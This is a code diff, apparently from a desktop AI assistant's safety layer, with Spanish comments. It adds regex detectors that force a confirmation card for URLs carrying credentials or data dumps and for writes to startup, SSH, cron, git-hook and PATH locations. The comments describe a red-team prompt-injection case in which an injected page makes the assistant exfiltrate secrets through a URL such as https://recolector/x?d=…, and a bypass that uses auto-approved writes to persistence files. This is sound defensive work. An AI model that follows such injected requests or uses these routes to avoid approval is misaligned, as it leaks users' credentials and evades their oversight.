@@ -453,3 +453,80 @@ function dangerScan(cmd) {
             return _PELIGROS[i].why
     return ""
 }
+
+// ── Exfiltración por URL ─────────────────────────────────────────────────────
+// El hueco que dejó a la vista el red-team. Descargar una URL es clase
+// "external", y eso admite permiso permanente ("Siempre"): una vez concedido, el
+// modelo puede descargar sin tarjeta. Y una descarga SACA datos además de
+// traerlos — lo que viaje en la URL se lo lleva quien esté al otro lado. El
+// ataque es de una línea: una página inyectada le pide al asistente que
+// "verifique" abriendo https://recolector/x?d=<lo que sea que tenga a mano>.
+//
+// Tapar el secreto en la respuesta no sirve de nada aquí: para cuando se tapa,
+// ya ha viajado. Lo que se mira es la petición.
+//
+// No se prohíbe: se fuerza la tarjeta, con el motivo escrito. Es la misma regla
+// que el detector de comandos destructivos — un falso positivo cuesta un clic y
+// un falso negativo cuesta una credencial.
+const _FUGAS = [
+    { re: /-----BEGIN [A-Z ]*PRIVATE KEY-----/i,
+      why: "la URL lleva dentro una clave privada" },
+    { re: /(?:^|[?&#])[^=&#]*(?:pass|passwd|password|secret|api[_-]?key|token|auth|credential|cookie|session)[^=&#]*=[^&#\s]{8,}/i,
+      why: "la URL lleva dentro algo con pinta de credencial" },
+    // sk-…, ghp_…, xoxb-… y compañía: las formas que tienen las claves de los
+    // servicios habituales, que un modelo puede haber leído en un archivo.
+    { re: /(?:^|[/?&#=])(?:sk|pk|rk)-[A-Za-z0-9_-]{16,}|\b(?:ghp|gho|ghs|ghr|github_pat)_[A-Za-z0-9_]{20,}|\bxox[baprs]-[A-Za-z0-9-]{10,}/,
+      why: "la URL lleva dentro lo que parece la clave de un servicio" },
+    // Un valor enorme y opaco en la consulta: la forma que tiene un volcado.
+    // Los enlaces normales llevan identificadores y palabras, no bloques de
+    // trescientos caracteres sin un espacio.
+    { re: /[?&][^=&#]{1,40}=[A-Za-z0-9+/=_-]{300,}/,
+      why: "la URL lleva un bloque de datos enorme en un parámetro" }
+]
+function urlLeakScan(url) {
+    const s = String(url || "")
+    for (let i = 0; i < _FUGAS.length; i++)
+        if (_FUGAS[i].re.test(s))
+            return _FUGAS[i].why
+    return ""
+}
+
+// ── Escrituras que se convierten en EJECUCIÓN ────────────────────────────────
+// El otro hueco que enseñó el red-team, y el que tiene dientes de verdad. La
+// ejecución nunca se auto-aprueba —eso aguanta hasta en la configuración más
+// floja—, así que una inyección no va a conseguir un `run_command`. Lo que sí
+// puede intentar es dar un rodeo: si el usuario ha puesto la escritura en
+// "auto", basta con escribir en el sitio correcto y esperar. Un `.bashrc`, un
+// `.desktop` en autostart o un hook de git no son archivos: son comandos con
+// retardo.
+//
+// Igual que con los comandos destructivos, esto no prohíbe: fuerza la tarjeta y
+// escribe el motivo. Escribir tu propio .bashrc es perfectamente legítimo — lo
+// que no es legítimo es que ocurra sin que lo veas.
+const _RUTAS_ARRANQUE = [
+    { re: /\/\.(bash_profile|bashrc|bash_login|bash_logout|profile|zshrc|zprofile|zshenv|zlogin|kshrc)$/,
+      why: "un archivo que se ejecuta al abrir una terminal" },
+    { re: /\/\.config\/autostart\//,
+      why: "el arranque automático de la sesión gráfica" },
+    { re: /\/(\.config|\.local\/share)\/systemd\//,
+      why: "una unidad de systemd del usuario" },
+    { re: /\/\.ssh\/(authorized_keys|config|rc)$/,
+      why: "la configuración de acceso por SSH" },
+    { re: /\/(crontab|cron\.[a-z]+)\//, why: "una tarea programada" },
+    { re: /\/\.git\/hooks\//, why: "un hook de git, que corre al usar el repositorio" },
+    { re: /\/(\.local\/bin|\/usr\/local\/bin|\/bin)\/[^/]+$/,
+      why: "una carpeta del PATH: lo que se escriba ahí se ejecuta por su nombre" },
+    // El propio shell del escritorio: escribir aquí es cambiar el código que
+    // corre en cuanto el vigilante de archivos vea el cambio.
+    { re: /\/\.config\/quickshell\//,
+      why: "la configuración de este mismo escritorio, que se recarga sola" },
+    { re: /\/\.(profile\.d|xprofile|xinitrc|xsession)$/,
+      why: "un archivo de inicio de sesión" }
+]
+function pathDangerScan(path) {
+    const s = String(path || "")
+    for (let i = 0; i < _RUTAS_ARRANQUE.length; i++)
+        if (_RUTAS_ARRANQUE[i].re.test(s))
+            return _RUTAS_ARRANQUE[i].why
+    return ""
+}
